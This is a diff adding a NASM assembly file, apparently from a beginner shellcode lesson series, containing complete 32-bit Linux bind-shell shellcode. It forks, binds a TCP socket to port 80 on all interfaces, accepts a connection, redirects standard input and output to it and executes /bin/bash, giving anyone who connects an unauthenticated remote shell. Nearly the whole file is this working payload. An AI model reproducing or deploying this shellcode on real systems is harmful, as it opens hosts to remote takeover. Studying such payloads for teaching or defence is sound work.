@@ -1,0 +1,114 @@
+;
+; part of my shellcode for noobs lesson series hosted in #goatzzz on irc.enigmagroup.org
+; SAFETY:
+;   /!\ DO NOT FORGET TO KILL THIS AFTER RUNNING IT, IT WILL LEAVE YOU WITH AN OPEN SHELL FACING THE INTERNET /!\
+; ----------------------------------------------------------------------------
+; "THE BEER-WARE LICENSE" (Revision 43):
+; <aaronryool@gmail.com> wrote this file. As long as you retain this notice you
+; can do whatever you want with this stuff. If we meet some day, and you think
+; this stuff is worth it, you can buy me a beer in return Aaron R. Yool
+; ----------------------------------------------------------------------------
+; 32bit call: eax args: ebx, ecx, edx, esi, edi, and ebp
+
+[bits 32]
+section .text
+global _start
+_start:
+; fork(void);
+	xor eax,eax
+	mov al,0x02
+	int 0x80
+	cmp eax,1	; if this is a child, or we have failed to clone
+	jl fork		; jump to the main code
+	jmp exit
+fork:
+; socket(AF_INET, SOCK_STREAM, 0);
+	xor eax,eax
+	xor ebx,ebx
+	push eax
+	mov al,0x6	; IPPROTO_TCP
+	push eax
+	mov al,0x1	; SOCK_STREAM
+	push eax
+	mov al,0x2	; AF_INET
+	push eax
+	xor eax,eax
+	mov al, 0x66 ; sys_socketcall
+	mov bl,0x1	; sys_socket
+	mov ecx,esp
+	int 0x80
+; bind(s, (struct sockaddr *) &name, sizeof (name));
+	mov esi,eax
+	xor eax,eax
+	xor ebx,ebx
+	push eax	; garbage
+	push eax	; garbage
+	push eax	; sin_addr.s_addr
+	mov ah,0x50
+	push eax; sin_port: 80
+	xor eax,eax
+	mov bl,0x02 ; sin_family: AF_INET
+	push bx
+	mov edx,esp
+	mov bl,0x10
+	push ebx
+	mov bl,0x2 ; sys_bind
+	push edx
+	push esi ;s
+	mov edx,esi
+	mov ecx,esp
+	mov al,0x66 ; sys_socketcall
+	int 0x80
+
+; listen(s, 0);
+	xor eax,eax
+	mov bl,0x4  ; sys_listen
+	mov al,0x66 ; sys_socketcall
+	int 0x80
+
+; accept(s, 0, 0);
+	xor eax,eax
+	xor ebx,ebx
+	push eax
+	push eax
+	push esi	; sin
+	mov ecx,esp
+	mov bl,0x5  ; sys_accept
+	mov al,0x66 ; sys_socketcall
+	int 0x80
+
+; dup2(sin,i);
+	mov esi,eax
+	xor ebx,ebx
+	xor ecx,ecx
+loop:
+	xor eax,eax
+	mov ebx,esi	; sin
+	mov al,0x3f	; sys_dup2
+	int 0x80
+	inc ecx
+	cmp ecx,4
+	jne loop
+
+; execve(SHELLPATH,{SHELLPATH,0},0);
+	xor eax,eax
+	mov al,0x0b
+	jmp short sh
+load_sh:
+	pop esi
+	xor edx,edx
+	push edx
+	push esi
+	mov ecx,esp
+	mov ebx,esi
+	int 0x80
+exit:
+; exit(0);
+	xor eax,eax
+	mov al,0x1
+	xor ebx,ebx
+	int 0x80
+
+sh:
+	call load_sh
+	db "/bin/bash"
